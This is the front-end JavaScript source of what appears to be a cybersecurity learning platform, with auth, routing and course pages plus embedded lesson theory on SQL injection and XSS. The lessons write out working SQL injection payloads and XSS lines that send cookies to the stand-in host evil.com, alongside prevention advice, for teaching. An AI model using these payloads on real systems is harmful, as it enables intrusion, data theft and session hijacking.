/* ============================================================
   ZentinelS v2.0 – Learning Platform SPA
   Dark Sidebar  +  Light Content  +  Interactive Demos/Labs
   ============================================================ */

(function () {
    'use strict';

    const API = '/securitylab/api';

    /* ── State ─────────────────────────────────── */
    const state = {
        user: null,
        courses: [],
        lessons: [],
        categories: [],
        progress: [],
        currentLesson: null,
        quizData: [],
        quizIndex: 0,
        quizScore: 0,
        quizAnswered: false,
        quizAnswers: [],
    };

    /* ── DOM helpers ───────────────────────────── */
    const $ = (s, p) => (p || document).querySelector(s);
    const $$ = (s, p) => [...(p || document).querySelectorAll(s)];
    const el = (tag, cls, html) => {
        const e = document.createElement(tag);
        if (cls) e.className = cls;
        if (html) e.innerHTML = html;
        return e;
    };

    /* ── Progress helpers ─────────────────────── */
    function isLessonCompleted(lessonId) {
        const p = state.progress.find(pr => pr.lessonId === lessonId);
        return p && (p.completed || p.lessonStatus === 'completed');
    }
    function isLessonStarted(lessonId) {
        const p = state.progress.find(pr => pr.lessonId === lessonId);
        return p && (p.lessonStatus === 'in_progress' || p.lessonStatus === 'completed' || p.demoCompleted || p.labCompleted || p.quizCompleted);
    }
    function getLessonProgress(lessonId) {
        return state.progress.find(pr => pr.lessonId === lessonId) || null;
    }

    /* ── API helpers ──────────────────────────── */
    async function api(path, opts = {}) {
        try {
            const res = await fetch(API + path, {
                credentials: 'include',
                headers: { 'Content-Type': 'application/json', ...opts.headers },
                ...opts,
            });
            const text = await res.text();
            const json = text ? JSON.parse(text) : {};
            if (!res.ok) throw new Error(json.error || `HTTP ${res.status}`);
            return json;
        } catch (e) {
            console.error('API error:', e);
            throw e;
        }
    }

    /* ── Toast ────────────────────────────────── */
    function toast(msg, type = 'info') {
        let c = $('.toast-container');
        if (!c) { c = el('div', 'toast-container'); document.body.appendChild(c); }
        const t = el('div', `toast toast-${type}`, msg);
        c.appendChild(t);
        setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3500);
    }

    /* ============================================================
       AUTH
       ============================================================ */
    function initAuth() {
        const overlay = $('#authOverlay');
        const modal = $('#authModal');
        const closeBtn = $('#authClose');
        const form = $('#authForm');
        const title = $('#authTitle');
        const subtitle = $('#authSubtitle');
        const toggleLink = $('#authToggle');
        const toggleText = $('#authToggleText');
        const nameGroup = $('#nameGroup');
        const authError = $('#authError');
        const submitBtn = $('#authSubmitBtn');
        const signInBtn = $('#signInBtn');
        const signUpBtn = $('#signUpBtn');
        const logoutBtn = $('#logoutBtn');

        let mode = 'login';

        function showModal(m) {
            mode = m;
            overlay.classList.remove('hidden');
            authError.classList.remove('show');
            form.reset();
            if (mode === 'login') {
                title.textContent = 'Welcome Back';
                subtitle.textContent = 'Sign in to continue your security journey';
                nameGroup.classList.add('hidden');
                toggleText.innerHTML = 'Don\'t have an account? <a href="#" id="authToggle">Sign up</a>';
                submitBtn.textContent = 'Sign In';
            } else {
                title.textContent = 'Create Account';
                subtitle.textContent = 'Start your cybersecurity learning journey';
                nameGroup.classList.remove('hidden');
                toggleText.innerHTML = 'Already have an account? <a href="#" id="authToggle">Sign in</a>';
                submitBtn.textContent = 'Create Account';
            }
            // re-bind the toggler
            const tl = $('#authToggle');
            if (tl) tl.onclick = (e) => { e.preventDefault(); showModal(mode === 'login' ? 'register' : 'login'); };
        }

        if (signInBtn) signInBtn.onclick = () => showModal('login');
        if (signUpBtn) signUpBtn.onclick = () => showModal('register');
        if (closeBtn) closeBtn.onclick = () => overlay.classList.add('hidden');
        overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.classList.add('hidden'); });

        if (logoutBtn) logoutBtn.onclick = async () => {
            try { await api('/auth/logout', { method: 'POST' }); } catch (_) {}
            state.user = null;
            updateAuthUI();
            toast('Logged out successfully', 'success');
            navigate('/');
        };

        form.onsubmit = async (e) => {
            e.preventDefault();
            authError.classList.remove('show');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Please wait…';
            try {
                const body = { username: $('#authUsername').value, password: $('#authPassword').value };
                if (mode === 'register') {
                    body.displayName = $('#authName').value;
                    body.email = $('#authUsername').value + '@zentinels.local';
                }
                const data = await api(`/auth/${mode}`, { method: 'POST', body: JSON.stringify(body) });
                state.user = data;
                overlay.classList.add('hidden');
                updateAuthUI();
                toast(`Welcome${state.user.displayName ? ', ' + state.user.displayName : ''}!`, 'success');
                loadProgress();
                navigate(location.hash || '#/');
            } catch (err) {
                authError.textContent = err.message;
                authError.classList.add('show');
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = mode === 'login' ? 'Sign In' : 'Create Account';
            }
        };
    }

    function updateAuthUI() {
        const signIn = $('#signInBtn');
        const signUp = $('#signUpBtn');
        const logout = $('#logoutBtn');
        const userSection = $('#sidebarUser');
        const userName = $('#sidebarUserName');
        const userAvatar = $('#sidebarUserAvatar');

        if (state.user) {
            if (signIn) signIn.classList.add('hidden');
            if (signUp) signUp.classList.add('hidden');
            if (logout) logout.classList.remove('hidden');
            if (userSection) userSection.classList.remove('hidden');
            if (userName) userName.textContent = state.user.displayName || state.user.username;
            if (userAvatar) userAvatar.textContent = (state.user.displayName || state.user.username || 'U').charAt(0).toUpperCase();
        } else {
            if (signIn) signIn.classList.remove('hidden');
            if (signUp) signUp.classList.remove('hidden');
            if (logout) logout.classList.add('hidden');
            if (userSection) userSection.classList.add('hidden');
        }
    }

    async function checkSession() {
        try {
            const data = await api('/auth/me');
            if (data && data.id) { state.user = data; updateAuthUI(); loadProgress(); }
        } catch (_) {}
    }

    async function loadProgress() {
        if (!state.user) return;
        try { state.progress = await api('/progress'); } catch (_) { state.progress = []; }
    }

    /* ============================================================
       ROUTER
       ============================================================ */
    const routes = [
        { path: /^#?\/?$/, handler: renderDashboard },
        { path: /^#?\/courses\/?$/, handler: renderCourses },
        { path: /^#?\/courses\/([^/]+)\/?$/, handler: renderCourseDetail },
        { path: /^#?\/lessons\/?$/, handler: renderAllLessons },
        { path: /^#?\/lesson\/([^/]+)\/?$/, handler: renderLessonDetail },
        { path: /^#?\/score\/?$/, handler: renderScore },
        { path: /^#?\/achievements\/?$/, handler: renderAchievements },
    ];

    function navigate(hash) {
        if (!hash.startsWith('#')) hash = '#' + hash;
        location.hash = hash;
    }

    function router() {
        const hash = location.hash || '#/';
        for (const r of routes) {
            const m = hash.match(r.path);
            if (m) {
                setActiveNav(hash);
                r.handler(m);
                return;
            }
        }
        renderDashboard();
    }

    function setActiveNav(hash) {
        $$('.nav-item').forEach((item) => {
            item.classList.toggle('active', item.dataset.route && hash.startsWith('#' + item.dataset.route));
        });
        // breadcrumb
        const bc = $('#breadcrumb');
        if (bc) {
            const parts = hash.replace('#/', '').split('/').filter(Boolean);
            if (parts.length === 0) bc.innerHTML = '<span>Dashboard</span>';
            else bc.innerHTML = '<span>Home</span>' + parts.map((p) => `<span>${decodeURIComponent(p).replace(/-/g, ' ')}</span>`).join('');
        }
    }

    /* ============================================================
       DATA LOADING
       ============================================================ */
    async function loadCourses() {
        if (state.courses.length) return state.courses;
        try { state.courses = await api('/courses'); } catch (_) { state.courses = []; }
        return state.courses;
    }

    async function loadCourseDetail(slug) {
        try {
            const data = await api(`/courses/${slug}`);
            // API returns {course: {...}, levels: [...]}
            if (data && data.course) {
                const course = data.course;
                course.levels = data.levels || [];
                return course;
            }
            return data;
        } catch (_) { return null; }
    }

    async function loadLessons() {
        if (state.lessons.length) return state.lessons;
        try { state.lessons = await api('/lessons'); } catch (_) { state.lessons = []; }
        return state.lessons;
    }

    async function loadLesson(slug) {
        try { return await api(`/lessons/${slug}`); } catch (_) { return null; }
    }

    async function loadQuiz(lessonId) {
        try { return await api(`/quiz/${lessonId}`); } catch (_) { return []; }
    }

    /* ============================================================
       PAGES
       ============================================================ */

    function content() { return $('#mainContent'); }

    /* ---- Dashboard ---- */
    async function renderDashboard() {
        const c = content();
        const courses = await loadCourses();
        const lessons = await loadLessons();
        const completed = state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length;

        c.innerHTML = `
            <div class="welcome-banner">
                <h1>⚡ ZentinelS Learning Platform</h1>
                <p>Master cybersecurity through interactive courses, live demos, and hands-on lab exercises. Sharpen your offensive and defensive security skills.</p>
                <a href="#/courses" class="btn btn-primary">Browse Courses →</a>
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon blue">📚</div>
                    <div class="stat-info"><div class="stat-value">${courses.length}</div><div class="stat-label">Courses</div></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon green">📝</div>
                    <div class="stat-info"><div class="stat-value">${lessons.length}</div><div class="stat-label">Lessons</div></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon purple">✅</div>
                    <div class="stat-info"><div class="stat-value">${completed}</div><div class="stat-label">Completed</div></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon yellow">🔄</div>
                    <div class="stat-info"><div class="stat-value">${state.progress.filter((p) => p.lessonStatus === 'in_progress').length}</div><div class="stat-label">In Progress</div></div>
                </div>
                </div>
            </div>

            <div class="section-header"><h2>Featured Courses</h2></div>
            <div class="courses-grid" id="dashCourses"></div>
        `;

        const g = $('#dashCourses');
        courses.slice(0, 3).forEach((course) => g.appendChild(courseCardEl(course)));
    }

    /* ---- Courses List ---- */
    async function renderCourses() {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading courses…</span></div>';
        const courses = await loadCourses();
        c.innerHTML = `<div class="section-header"><h2>All Courses</h2></div><div class="courses-grid" id="coursesGrid"></div>`;
        const g = $('#coursesGrid');
        if (courses.length === 0) { g.innerHTML = '<div class="empty-state"><div class="icon">📚</div><p>No courses available yet.</p></div>'; return; }
        courses.forEach((course) => g.appendChild(courseCardEl(course)));
    }

    function courseCardEl(course) {
        const color = course.color || '#4c9aff';
        const d = el('div', 'course-card');
        const lessonCount = course.lessonCount || 0;
        const levelCount = course.levelCount || 0;
        d.innerHTML = `
            <div class="course-card-banner" style="background:linear-gradient(135deg,${color},${color}99)"></div>
            <div class="course-card-body">
                <div class="course-card-icon-row">
                    <div class="course-card-icon">${course.icon || '📘'}</div>
                    <span class="meta-badge ${(course.difficulty || 'beginner').toLowerCase()}">${esc(course.difficulty || 'Beginner')}</span>
                </div>
                <h3>${esc(course.title)}</h3>
                <p>${esc(course.description || '')}</p>
                <div class="course-card-meta">
                    <span class="meta-badge info">📖 ${lessonCount} lesson${lessonCount !== 1 ? 's' : ''}</span>
                    <span class="meta-badge info">🎯 ${levelCount} level${levelCount !== 1 ? 's' : ''}</span>
                </div>
                <div class="course-card-action">
                    <span class="course-start-link">Explore Course →</span>
                </div>
            </div>`;
        d.onclick = () => navigate(`/courses/${course.slug}`);
        return d;
    }

    /* ---- Course Detail ---- */
    async function renderCourseDetail(match) {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading course…</span></div>';
        const slug = match[1];
        const data = await loadCourseDetail(slug);
        if (!data) { c.innerHTML = '<div class="empty-state"><div class="icon">😕</div><p>Course not found.</p></div>'; return; }
        const course = data.course || data;
        const levels = data.levels || course.levels || [];
        const totalLessons = levels.reduce((sum, l) => sum + (l.lessons || []).length, 0);
        const completedLessons = levels.reduce((sum, l) => sum + (l.lessons || []).filter(ls => isLessonCompleted(ls.id)).length, 0);
        const progressPct = totalLessons > 0 ? Math.round((completedLessons / totalLessons) * 100) : 0;

        c.innerHTML = `
            <div class="course-detail-page">
                <div class="course-header-enhanced">
                    <div class="course-header-top">
                        <button class="back-btn" onclick="location.hash='#/courses'">← All Courses</button>
                    </div>
                    <div class="course-header-content">
                        <div class="course-header-icon" style="background:${course.color || '#4c9aff'}22;color:${course.color || '#4c9aff'}">${course.icon || '📘'}</div>
                        <div class="course-header-info">
                            <h1>${esc(course.title)}</h1>
                            <p class="course-header-desc">${esc(course.description || '')}</p>
                            <div class="course-header-badges">
                                <span class="meta-badge ${(course.difficulty||'beginner').toLowerCase()}">${esc(course.difficulty||'Beginner')}</span>
                                <span class="meta-badge info">📖 ${totalLessons} lessons</span>
                                <span class="meta-badge info">🎯 ${levels.length} levels</span>
                                ${state.user ? `<span class="meta-badge ${progressPct === 100 ? 'beginner' : 'info'}">${progressPct === 100 ? '✅' : '📊'} ${progressPct}% complete</span>` : ''}
                            </div>
                        </div>
                    </div>
                    ${state.user && totalLessons > 0 ? `
                    <div class="course-progress-bar-wrapper">
                        <div class="course-progress-bar"><div class="course-progress-fill" style="width:${progressPct}%;background:${course.color || '#4c9aff'}"></div></div>
                        <span class="course-progress-text">${completedLessons}/${totalLessons} lessons completed</span>
                    </div>` : ''}
                </div>
                <div class="levels-timeline" id="levelsContainer"></div>
            </div>`;

        const lc = $('#levelsContainer');
        // Filter out levels with 0 lessons (like Introduction levels)
        const activeLevels = levels.filter(l => (l.lessons || []).length > 0);
        if (activeLevels.length === 0) { lc.innerHTML = '<div class="empty-state"><p>No lessons available yet. Check back soon!</p></div>'; return; }

        activeLevels.forEach((level, i) => {
            const card = el('div', `level-card ${i === 0 ? 'expanded' : ''}`);
            const lessons = level.lessons || [];
            const levelCompleted = lessons.length > 0 && lessons.every(ls => isLessonCompleted(ls.id));
            const levelStarted = lessons.some(ls => isLessonStarted(ls.id));

            card.innerHTML = `
                <div class="level-header">
                    <div class="level-number ${levelCompleted ? 'completed' : levelStarted ? 'started' : ''}">${levelCompleted ? '✓' : level.levelNumber || i + 1}</div>
                    <div class="level-info">
                        <h3>${esc(level.title)}</h3>
                        <p>${esc(level.description || '')}</p>
                    </div>
                    <div class="level-stats">
                        <span class="level-lesson-count">${lessons.length} lesson${lessons.length !== 1 ? 's' : ''}</span>
                        ${levelCompleted ? '<span class="level-status-badge completed">✅ Completed</span>' : levelStarted ? '<span class="level-status-badge in-progress">🔄 In Progress</span>' : ''}
                    </div>
                    <div class="level-chevron">▶</div>
                </div>
                <div class="level-lessons">
                    ${lessons.map((ls, li) => {
                        const lessonDone = isLessonCompleted(ls.id);
                        const lessonInProgress = isLessonStarted(ls.id) && !lessonDone;
                        const prog = getLessonProgress(ls.id);
                        const difficultyColor = (ls.difficulty || 'beginner') === 'advanced' ? '#e53e3e' : (ls.difficulty || 'beginner') === 'intermediate' ? '#d69e2e' : '#38a169';
                        const statusIcon = lessonDone ? '✅' : lessonInProgress ? '🔄' : '📄';
                        const statusLabel = lessonDone ? 'Completed' : lessonInProgress ? 'In Progress' : 'Not Started';
                        return `
                        <div class="lesson-list-item ${lessonDone ? 'completed' : lessonInProgress ? 'in-progress' : ''}" data-slug="${ls.slug}">
                            <div class="lesson-list-number">${li + 1}</div>
                            <div class="lesson-list-icon">${statusIcon}</div>
                            <div class="lesson-list-info">
                                <h4>${esc(ls.title)}</h4>
                                <span>${esc(ls.summary || ls.description || ls.categoryName || '')}</span>
                            </div>
                            <div class="lesson-list-meta">
                                <span class="lesson-status-label ${lessonDone ? 'done' : lessonInProgress ? 'progress' : 'new'}">${statusLabel}</span>
                                <span class="difficulty-dot" style="background:${difficultyColor}" title="${esc(ls.difficulty || 'beginner')}"></span>
                                ${prog && prog.quizScore > 0 ? `<span class="quiz-score-badge">${prog.quizScore}%</span>` : ''}
                                <span class="lesson-arrow">→</span>
                            </div>
                        </div>`;
                    }).join('')}
                </div>`;
            card.querySelector('.level-header').onclick = () => card.classList.toggle('expanded');
            card.querySelectorAll('.lesson-list-item').forEach((li) => li.addEventListener('click', () => navigate(`/lesson/${li.dataset.slug}`)));
            lc.appendChild(card);
        });
    }

    /* ---- All Lessons ---- */
    async function renderAllLessons() {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading lessons…</span></div>';
        const lessons = await loadLessons();

        const cats = [...new Set(lessons.map((l) => l.categoryName || 'Uncategorized'))];
        c.innerHTML = `
            <div class="section-header"><h2>All Lessons</h2></div>
            <div class="category-filter" id="catFilter">
                <span class="category-pill active" data-cat="all">All</span>
                ${cats.map((cat) => `<span class="category-pill" data-cat="${esc(cat)}">${esc(cat)}</span>`).join('')}
            </div>
            <div class="lessons-grid" id="lessonsGrid"></div>`;

        const g = $('#lessonsGrid');
        function render(filter) {
            g.innerHTML = '';
            lessons.filter((l) => filter === 'all' || (l.categoryName || 'Uncategorized') === filter)
                .forEach((l) => {
                    const card = el('div', 'lesson-card');
                    card.innerHTML = `
                        <div class="card-top"><span class="category-tag">${esc(l.categoryName || '')}</span></div>
                        <h3>${esc(l.title)}</h3>
                        <p>${esc(l.description || '')}</p>
                        <div class="card-action"><span class="btn btn-primary btn-sm">Start Lesson →</span></div>`;
                    card.onclick = () => navigate(`/lesson/${l.slug}`);
                    g.appendChild(card);
                });
            if (!g.children.length) g.innerHTML = '<div class="empty-state"><p>No lessons in this category.</p></div>';
        }

        render('all');
        $$('.category-pill').forEach((p) => p.onclick = () => {
            $$('.category-pill').forEach((x) => x.classList.remove('active'));
            p.classList.add('active');
            render(p.dataset.cat);
        });
    }

    /* ---- Lesson Detail ---- */
    async function renderLessonDetail(match) {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading lesson…</span></div>';
        const slug = match[1];
        const lesson = await loadLesson(slug);
        if (!lesson) { c.innerHTML = '<div class="empty-state"><div class="icon">😕</div><p>Lesson not found.</p></div>'; return; }
        state.currentLesson = lesson;

        const prog = getLessonProgress(lesson.id);
        const lessonDone = isLessonCompleted(lesson.id);
        const lessonInProgress = isLessonStarted(lesson.id) && !lessonDone;
        const statusText = lessonDone ? '✅ Completed' : lessonInProgress ? '🔄 In Progress' : '📄 Not Started';
        const statusClass = lessonDone ? 'done' : lessonInProgress ? 'progress' : 'new';

        c.innerHTML = `
            <div class="lesson-detail-header">
                <button class="back-btn" id="lessonBack">← Back</button>
                <div class="lesson-detail-info">
                    <h1>${esc(lesson.title)}</h1>
                    <div class="lesson-meta">
                        <span class="meta-badge info">${esc(lesson.categoryName || '')}</span>
                        <span class="meta-badge ${(lesson.difficulty || 'beginner').toLowerCase()}">${esc(lesson.difficulty || 'Beginner')}</span>
                        <span class="lesson-status-indicator ${statusClass}">${statusText}</span>
                    </div>
                    <p class="lesson-summary">${esc(lesson.summary || '')}</p>
                </div>
                ${state.user ? `
                <div class="lesson-tracking-bar">
                    <div class="tracking-sections">
                        <span class="tracking-item ${prog && prog.demoCompleted ? 'done' : ''}">🎯 Demo ${prog && prog.demoCompleted ? '✓' : ''}</span>
                        <span class="tracking-item ${prog && prog.labCompleted ? 'done' : ''}">🔬 Lab ${prog && prog.labCompleted ? '✓' : ''}</span>
                        <span class="tracking-item ${prog && prog.quizCompleted ? 'done' : ''}">❓ Quiz ${prog && prog.quizCompleted ? `✓ (${prog.quizScore}%)` : ''}</span>
                    </div>
                    <div class="lesson-action-btns">
                        ${lessonDone ? '<span class="lesson-complete-badge">✅ Lesson Completed</span>' :
                          lessonInProgress ? `<button class="btn btn-primary btn-sm" id="completeLessonBtn">✓ Mark Complete</button>` :
                          `<button class="btn btn-primary btn-sm" id="startLessonBtn">▶ Start Lesson</button>`}
                    </div>
                </div>` : ''}
            </div>
            <div class="lesson-tabs">
                <button class="lesson-tab active" data-tab="theory">📖 Theory</button>
                <button class="lesson-tab" data-tab="demo">🎯 Live Demo</button>
                <button class="lesson-tab" data-tab="lab">🔬 Lab</button>
                <button class="lesson-tab" data-tab="quiz">❓ Quiz</button>
            </div>
            <div class="tab-content-area">
                <div class="tab-pane active" id="pane-theory"></div>
                <div class="tab-pane" id="pane-demo"></div>
                <div class="tab-pane" id="pane-lab"></div>
                <div class="tab-pane" id="pane-quiz"></div>
            </div>`;

        // Back
        $('#lessonBack').onclick = () => history.back();

        // Start/Complete lesson buttons
        const startBtn = $('#startLessonBtn');
        const completeBtn = $('#completeLessonBtn');
        if (startBtn) {
            startBtn.onclick = async () => {
                try {
                    await api(`/progress/start/${lesson.id}`, { method: 'POST' });
                    await loadProgress();
                    toast('Lesson started! 🚀', 'success');
                    renderLessonDetail(match); // Re-render to update UI
                } catch (e) { toast('Failed to start lesson', 'error'); }
            };
        }
        if (completeBtn) {
            completeBtn.onclick = async () => {
                try {
                    await api(`/progress/complete/${lesson.id}`, { method: 'POST' });
                    await loadProgress();
                    toast('Lesson completed! 🎉', 'success');
                    renderLessonDetail(match); // Re-render to update UI
                } catch (e) { toast('Failed to complete lesson', 'error'); }
            };
        }

        // Tabs
        $$('.lesson-tab').forEach((tab) => {
            tab.onclick = () => {
                $$('.lesson-tab').forEach((t) => t.classList.remove('active'));
                $$('.tab-pane').forEach((p) => p.classList.remove('active'));
                tab.classList.add('active');
                $(`#pane-${tab.dataset.tab}`).classList.add('active');
            };
        });

        // Render content for each tab
        renderTheory(lesson);
        renderDemo(lesson);
        renderLab(lesson);
        renderQuizTab(lesson);
    }

    /* ---- Theory Tab ---- */
    function renderTheory(lesson) {
        const pane = $('#pane-theory');
        const content = lesson.content || lesson.contentHtml || '';
        if (content) {
            pane.innerHTML = `<div class="lesson-theory">${content}</div>`;
        } else {
            pane.innerHTML = `<div class="lesson-theory">${generateTheoryContent(lesson)}</div>`;
        }
    }

    function generateTheoryContent(lesson) {
        const slug = lesson.slug || '';
        const theories = {
            'sql-injection': `
                <h2>What is SQL Injection?</h2>
                <p>SQL Injection (SQLi) is one of the most critical and widespread web application vulnerabilities. It occurs when an attacker can insert or "inject" malicious SQL code into queries that an application sends to its database. It has been consistently ranked in the <strong>OWASP Top 10</strong> since its inception.</p>

                <div class="theory-callout danger">
                    <strong>⚠️ Real-World Impact:</strong> In 2017, Equifax suffered a breach exposing 147 million records. SQL injection remains the #1 attack vector for data breaches worldwide.
                </div>

                <h3>How It Works</h3>
                <p>When applications build SQL queries by concatenating user input directly into query strings, attackers can modify the query's logic:</p>
                <pre class="code-example">// ❌ VULNERABLE: String concatenation
String query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'";

// Attacker inputs username: ' OR '1'='1' --
// Resulting query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
//                                        ^^^^^^^^^ always true!
// The -- comments out the password check entirely</pre>

                <h3>Types of SQL Injection</h3>

                <h4>1. Classic / In-Band SQL Injection</h4>
                <p>The most common and easiest to exploit. The attacker uses the same communication channel to launch the attack and gather results. The results appear directly in the application's response.</p>
                <pre class="code-example">// Authentication bypass:
Username: ' OR '1'='1' --
Password: anything

// The query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
// Returns ALL users → login bypassed!</pre>

                <h4>2. Error-Based SQL Injection</h4>
                <p>Exploits database error messages to extract information. When the application displays raw error messages, attackers can craft queries that intentionally cause errors revealing database structure:</p>
                <pre class="code-example">// Force a type conversion error that reveals data:
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --

// Error: Conversion failed when converting 'users' to data type int
// → Attacker now knows table name is 'users'!

// Extract column names:
' AND 1=CONVERT(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users')) --</pre>

                <h4>3. UNION-Based SQL Injection</h4>
                <p>Uses the SQL UNION operator to combine results from the original query with results from injected queries. Requires matching the number of columns:</p>
                <pre class="code-example">// Step 1: Find the number of columns using ORDER BY
' ORDER BY 1 --    ← works
' ORDER BY 2 --    ← works
' ORDER BY 3 --    ← works
' ORDER BY 4 --    ← ERROR! → table has 3 columns

// Step 2: Find which columns are displayed
' UNION SELECT 'a','b','c' --

// Step 3: Extract data
' UNION SELECT username, password, email FROM users --

// → All usernames, passwords, and emails appear in the page!</pre>

                <h4>4. Blind SQL Injection (Boolean-Based)</h4>
                <p>When the application doesn't display data or errors, but behaves <em>differently</em> based on whether a condition is true or false. Attackers ask yes/no questions to extract data one bit at a time:</p>
                <pre class="code-example">// Ask: "Is the first character of the admin password 'a'?"
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --
→ Page loads normally = TRUE (character is 'a')

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'b' --
→ Page shows error/different = FALSE

// Automate with ASCII values:
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 96 --
// Binary search through ASCII values to find each character</pre>

                <h4>5. Blind SQL Injection (Time-Based)</h4>
                <p>The most stealthy technique — when there's no visible difference in responses, attackers use deliberate time delays to infer information:</p>
                <pre class="code-example">// MySQL:
' OR IF(1=1, SLEEP(5), 0) --
// Response delayed 5 seconds → condition was TRUE

// Extract data character by character:
' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96, SLEEP(5), 0) --
// 5-second delay → first char ASCII > 96 (lowercase letter)

// SQL Server:
'; IF (1=1) WAITFOR DELAY '0:0:5' --

// PostgreSQL:
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --</pre>

                <h4>6. Second-Order SQL Injection</h4>
                <p>The payload is stored in the database and triggered later in a different context. This bypasses input validation on the initial request:</p>
                <pre class="code-example">// Step 1: Register with malicious username
Username: admin'--

// Step 2: Later, password change uses stored username
UPDATE users SET password = 'newpass' WHERE username = 'admin'--'
// The stored username breaks the query
// → Admin's password is changed!</pre>

                <h3>Common Injection Points</h3>
                <table class="info-table">
                    <tr><th>Location</th><th>Example</th><th>Risk Level</th></tr>
                    <tr><td>Login forms</td><td>Username/password fields</td><td>🔴 Critical</td></tr>
                    <tr><td>Search boxes</td><td>Product search, user lookup</td><td>🔴 Critical</td></tr>
                    <tr><td>URL parameters</td><td><code>?id=1</code>, <code>?category=books</code></td><td>🔴 Critical</td></tr>
                    <tr><td>HTTP headers</td><td>User-Agent, Referer, Cookie</td><td>🟠 High</td></tr>
                    <tr><td>Order/Sort parameters</td><td><code>?sort=name&order=ASC</code></td><td>🟠 High</td></tr>
                    <tr><td>Hidden form fields</td><td>Product ID, user role</td><td>🟡 Medium</td></tr>
                </table>

                <h3>Impact</h3>
                <ul>
                    <li><strong>Data breach</strong> — Unauthorized access to passwords, credit cards, PII</li>
                    <li><strong>Data manipulation</strong> — Modify or delete records, corrupt databases</li>
                    <li><strong>Authentication bypass</strong> — Login as any user including admin</li>
                    <li><strong>Remote code execution</strong> — Via <code>xp_cmdshell</code> (SQL Server) or <code>INTO OUTFILE</code> (MySQL)</li>
                    <li><strong>Denial of service</strong> — Drop tables, corrupt data, overload server</li>
                    <li><strong>Full server compromise</strong> — Pivot from database to OS-level access</li>
                </ul>

                <h3>Prevention — Defense in Depth</h3>
                <p>The <strong>#1 defense</strong> is <strong>Prepared Statements</strong> (parameterized queries). They fundamentally separate SQL code from user data:</p>
                <pre class="code-example">// ❌ VULNERABLE: String concatenation
String query = "SELECT * FROM users WHERE username = '" + user + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// ✅ SAFE: Prepared Statement
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);  // Data can NEVER modify query structure
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();</pre>

                <h4>Additional Defenses:</h4>
                <ul>
                    <li><strong>Parameterized queries</strong> — The gold standard. Use in every language: Java PreparedStatement, Python sqlite3 parameterized, PHP PDO, Node.js parameterized</li>
                    <li><strong>Stored procedures</strong> — With parameterized inputs (not string concatenation inside)</li>
                    <li><strong>Input validation</strong> — Allow-list filtering (not deny-list). Validate data types, lengths, ranges</li>
                    <li><strong>Least privilege</strong> — Database accounts should only have minimum required permissions</li>
                    <li><strong>WAF (Web Application Firewall)</strong> — As an additional layer, not a primary defense</li>
                    <li><strong>Error handling</strong> — Never expose raw database errors to users</li>
                    <li><strong>Regular security testing</strong> — Automated SAST/DAST tools + manual penetration testing</li>
                </ul>`,
            'cross-site-scripting': `
                <h2>What is Cross-Site Scripting (XSS)?</h2>
                <p>XSS allows attackers to inject malicious client-side scripts into web pages viewed by other users. The browser trusts the script because it appears to come from the legitimate website, giving the attacker access to cookies, session tokens, and sensitive page content.</p>
                <h3>Types of XSS</h3>
                <table class="info-table">
                    <tr><th>Type</th><th>How it Works</th><th>Persistence</th></tr>
                    <tr><td>Reflected</td><td>Payload in URL/request, reflected in response. Victim must click a crafted link.</td><td>Non-persistent</td></tr>
                    <tr><td>Stored</td><td>Payload stored in database (e.g. comments, profiles), served to all users who view the page.</td><td>Persistent — most dangerous</td></tr>
                    <tr><td>DOM-based</td><td>Payload processed entirely by client-side JavaScript without server involvement</td><td>Non-persistent</td></tr>
                </table>
                <h3>Reflected XSS Example</h3>
                <p>A search page reflects user input without sanitization:</p>
                <pre class="code-example">&lt;!-- URL: https://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;

&lt;!-- Server response: --&gt;
&lt;p&gt;Search results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;

&lt;!-- Browser executes the script! --&gt;</pre>
                <h3>Stored XSS Example</h3>
                <p>An attacker posts a comment containing JavaScript. Every user who views the page becomes a victim:</p>
                <pre class="code-example">&lt;!-- Attacker posts this comment: --&gt;
&lt;script&gt;
  document.location = 'https://evil.com/steal?cookie=' + document.cookie;
&lt;/script&gt;

&lt;!-- Or using event handlers: --&gt;
&lt;img src=x onerror="fetch('https://evil.com/log?c='+document.cookie)"&gt;</pre>
                <h3>Impact</h3>
                <ul>
                    <li>Session hijacking (cookie theft)</li>
                    <li>Keylogging user input on the page</li>
                    <li>Defacing the website content</li>
                    <li>Phishing through injected login forms</li>
                    <li>Redirecting users to malicious sites</li>
                    <li>Cryptocurrency mining in user's browser</li>
                </ul>
                <h3>Prevention</h3>
                <ul>
                    <li><strong>Context-sensitive output encoding</strong> — HTML encode for HTML context, JavaScript encode for JS context, URL encode for URL context</li>
                    <li><strong>Content Security Policy (CSP)</strong> headers — restrict script sources</li>
                    <li>HTTPOnly and Secure cookie flags</li>
